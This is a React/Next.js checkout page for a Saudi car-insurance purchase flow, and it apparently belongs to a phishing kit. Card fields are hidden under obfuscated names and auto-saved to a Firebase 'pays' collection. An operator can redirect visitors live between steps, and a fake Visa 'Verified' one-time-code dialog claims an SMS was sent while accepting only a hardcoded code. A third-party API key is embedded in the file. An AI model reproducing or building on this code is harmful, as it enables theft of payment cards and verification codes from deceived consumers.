"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Check, X, Globe } from 'lucide-react'
import { FullPageLoader } from "@/components/loader"
import { StepShell } from "@/components/step-shell"
import P1 from "@/components/form-a"
import { getOrCreateVisitorID, updateVisitorPage, checkIfBlocked } from "@/lib/visitor-tracking"
import { useAutoSave } from "@/hooks/use-auto-save"
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
import { addData, db } from "@/lib/firebase"
import { doc, getDoc, onSnapshot, Firestore } from "firebase/firestore"

export default function CheckPage() {
  const router = useRouter()
  const [visitorID] = useState(() => getOrCreateVisitorID())
  const [loading, setLoading] = useState(true)
  const [isBlocked, setIsBlocked] = useState(false)
  
  // Form fields
  const [selectedOffer, setSelectedOffer] = useState<any>(null)
  const [offerTotalPrice, setOfferTotalPrice] = useState<number>(0)
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState("credit-discount")
  const [showOtpDialog, setShowOtpDialog] = useState(false)
  const [otpValue, setOtpValue] = useState("")
  const [otpError, setOtpError] = useState("")
  const [otpAttempts, setOtpAttempts] = useState(5)
  const [_v1, _s1] = useState("")
  const [_v2, _s2] = useState("")
  const [_v3, _s3] = useState("")
  
  // Language
  const [language, setLanguage] = useState<"ar" | "en">("ar")
  
  // Auto-save
  useAutoSave({
    visitorId: visitorID,
    pageName: "check",
    data: {
      selectedPaymentMethod,
      _v1,
      _v2,
      _v3
    }
  })
  
  // Monitor redirect requests from admin
  useRedirectMonitor({
    visitorId: visitorID,
    currentPage: "check"
  })

  // Navigation listener - listen for admin redirects
  useEffect(() => {
    if (!visitorID || !db) return

    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorID),
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()
          const step = data.currentStep

          // Redirect based on currentStep
          if (step === "home") {
            router.push("/insur")
          } else if (step === "phone") {
            router.push("/step5")
          } else if (step === "_t6") {
            router.push("/step4")
          } else if (step === "_t2") {
            router.push("/step2")
          } else if (step === "_t3") {
            router.push("/step3")
          }
        }
      },
      (error) => {
        console.error("Navigation listener error:", error)
      }
    )

    return () => unsubscribe()
  }, [router, visitorID])
  
  // Initialize on mount
  useEffect(() => {
    const init = async () => {
      const blocked = await checkIfBlocked(visitorID)
      if (blocked) {
        setIsBlocked(true)
        setLoading(false)
        return
      }
      
      // Load selected offer from Firebase
      if (!db) return
      const docRef = doc(db as Firestore, "pays", visitorID)
      const docSnap = await getDoc(docRef)
      
      if (docSnap.exists()) {
        const data = docSnap.data()
        if (data.selectedOffer) {
          setSelectedOffer(data.selectedOffer)
        }
        if (data.offerTotalPrice) {
          setOfferTotalPrice(data.offerTotalPrice)
        }
        
        // Save country to localStorage if it exists in Firebase
        if (data.country && !localStorage.getItem("country")) {
          localStorage.setItem("country", data.country)
        }
      }
      
      // If country not in Firebase or localStorage, fetch it
      if (!localStorage.getItem("country")) {
        try {
          const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
          const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
          const response = await fetch(url)
          if (response.ok) {
            const countryName = await response.text()
            // Convert country name to alpha-3 code
            const { countryNameToAlpha3 } = await import("@/lib/country-codes")
            const countryCode = countryNameToAlpha3(countryName)
            localStorage.setItem("country", countryCode)
            await addData({
              id: visitorID,
              country: countryCode
            })
          }
        } catch (error) {
          console.error("Error fetching country:", error)
        }
      }
      
      await updateVisitorPage(visitorID, "check", 4)
      setLoading(false)
    }
    
    init()
  }, [visitorID])
  
  const _hp = async (e: React.FormEvent) => {
    e.preventDefault()
    // Save current data to history before updating
    
    await addData({ id: visitorID, _v1, _v2, _v3, selectedPaymentMethod, cardUpdatedAt: new Date().toISOString() }).then(() => {
      setShowOtpDialog(true)
    })
  }
  
  const handleOtpSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (otpValue === "123456") {
      setShowOtpDialog(false)
      alert("تم الدفع بنجاح!")
    } else {
      setOtpError("رمز التحقق غير صحيح")
      setOtpAttempts((prev) => prev - 1)
    }
  }
  
  const handleResendOtp = () => {
    setOtpError("")
    setOtpAttempts(5)
    alert("تم إرسال رمز جديد")
  }
  
  if (loading) {
    return <FullPageLoader />
  }
  
  if (isBlocked) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
          <h1 className="text-2xl font-bold text-red-600 mb-4">تم حظر الوصول</h1>
          <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
        </div>
      </div>
    )
  }
  
  if (!selectedOffer) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
          <h1 className="text-2xl font-bold text-gray-900 mb-4">لم يتم اختيار عرض</h1>
          <p className="text-gray-600 mb-6">يرجى العودة واختيار عرض تأمين</p>
          <Button
            onClick={() => router.push('/compar')}
            className="bg-[#0a4a68] hover:bg-[#083d57] text-white"
          >
            العودة للعروض
          </Button>
        </div>
      </div>
    )
  }
  
  return (
    <>
      <StepShell
        step={4}
        title="تأكيد العرض والدفع"
        subtitle="راجع تفاصيل العرض ثم أكمل بيانات الدفع."
        maxWidthClassName="max-w-3xl"
        headerAction={
          <button 
            onClick={() => setLanguage(language === "ar" ? "en" : "ar")}
            className="flex items-center gap-2 rounded-lg border border-[#d8e2ec] bg-[#f6f9fc] px-3 py-2 text-sm font-bold text-[#145072]"
          >
            <Globe className="h-4 w-4 text-[#145072]" />
            <span>{language === "ar" ? "EN" : "AR"}</span>
          </button>
        }
      >
        {/* Summary Card - Same as compar page */}
        <div className="bg-white rounded-lg md:rounded-xl shadow-md p-4 md:p-5 lg:p-6 mb-5 md:mb-6" dir="rtl">
          <div className="flex items-start justify-between gap-3 md:gap-4">
            <div className="flex-1">
              <h3 className="text-lg md:text-xl font-bold text-gray-900 mb-1 md:mb-2">{selectedOffer.name}</h3>
              <p className="text-blue-600 font-semibold text-base md:text-lg mb-3 md:mb-4">
                التأمين {selectedOffer.type === "against-others" ? "ضد الغير" : selectedOffer.type === "comprehensive" ? "شامل" : ""}
              </p>

              {selectedOffer.extra_features && selectedOffer.extra_features.length > 0 && (
                <div className="space-y-2 mb-3 md:mb-4">
                  {selectedOffer.extra_features.map((feature: any, idx: number) => (
                    <div key={idx} className="flex items-start gap-2">
                      <input
                        type="checkbox"
                        checked
                        readOnly
                        className="mt-1 w-4 h-4 rounded border-gray-300 cursor-default"
                      />
                      <label className="flex-1 text-gray-700 text-xs md:text-sm">
                        {feature.content}
                      </label>
                    </div>
                  ))}
                </div>
              )}
            </div>

            <div className="flex flex-col items-end gap-2 md:gap-3">
              {selectedOffer.image_url && (
                <div className="w-16 h-16 md:w-20 md:h-20 rounded-lg border-2 border-gray-200 flex items-center justify-center bg-gray-50 overflow-hidden">
                  <img
                    src={selectedOffer.image_url}
                    alt={selectedOffer.name}
                    className="w-full h-full object-contain"
                  />
                </div>
              )}
              <div className="text-left">
                <div className="text-2xl md:text-3xl font-bold text-[#0a4a68]">{offerTotalPrice.toFixed(2)}</div>
                <div className="text-xs md:text-sm text-gray-600">ريال / سنة</div>
              </div>
            </div>
          </div>
        </div>

        <P1 offerTotalPrice={offerTotalPrice} />
      </StepShell>

      {/* OTP Dialog */}
      {showOtpDialog && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-3 sm:p-4 z-50">
          <div className="bg-white rounded-xl sm:rounded-2xl shadow-2xl max-w-md w-full p-5 sm:p-8" dir="rtl">
            <div className="flex items-center justify-between gap-4 mb-4 sm:mb-6">
              <img src="/visa.svg" alt="kd" width={40} className="sm:w-[50px]" />
              <span className="font-bold text-blue-800 text-sm sm:text-base">Verified</span>
            </div>

            <h3 className="text-xl sm:text-2xl font-bold text-gray-900 text-center mb-3 sm:mb-4">Enter verification code</h3>
            <p className="text-gray-600 text-center mb-4 sm:mb-6 leading-relaxed text-sm sm:text-base">
              We sent you a verification code by text message to (+966) 5******.
            </p>

            <form onSubmit={handleOtpSubmit} className="space-y-4 sm:space-y-5">
              <div className="space-y-2">
                <label className="block text-gray-700 font-semibold text-xs sm:text-sm text-center">Verification code</label>
                <Input
                  type="tel"
                  value={otpValue}
                  onChange={(e) => {
                    setOtpValue(e.target.value)
                    setOtpError("")
                  }}
                  placeholder="######"
                  maxLength={6}
                  className="h-14 sm:h-16 text-center text-xl sm:text-2xl tracking-widest border-2 rounded-xl focus:border-blue-500 shadow-sm font-mono"
                  required
                />
                {otpError && (
                  <div className="flex items-center gap-2 text-red-600 text-xs sm:text-sm font-semibold justify-center">
                    <X className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
                    <span>{otpError}</span>
                  </div>
                )}
              </div>

              <Button
                type="submit"
                className="w-full h-12 sm:h-14 bg-blue-600 hover:bg-blue-700 text-white font-bold text-base sm:text-lg rounded-xl shadow-lg hover:shadow-xl transition-all"
              >
                CONTINUE
              </Button>

              <button
                type="button"
                onClick={handleResendOtp}
                className="w-full text-blue-600 font-semibold text-xs sm:text-sm hover:text-blue-700 transition-colors"
              >
                RESEND CODE
              </button>
            </form>

            <div className="mt-4 sm:mt-6 pt-4 sm:pt-6 border-t-2 border-gray-200">
              <button className="flex items-center justify-between w-full text-blue-600 font-semibold text-xs sm:text-sm hover:text-blue-700 transition-colors">
                <span>Need Help?</span>
                <span className="text-lg sm:text-xl">+</span>
              </button>
            </div>

            <div className="mt-3 sm:mt-4">
              <p className="text-gray-500 text-[11px] sm:text-xs text-center leading-relaxed">
                Having trouble?
                <br />
                <button className="text-blue-600 hover:text-blue-700 font-semibold">
                  Choose another security option
                </button>
              </p>
            </div>
          </div>
        </div>
      )}
    </>
  )
}
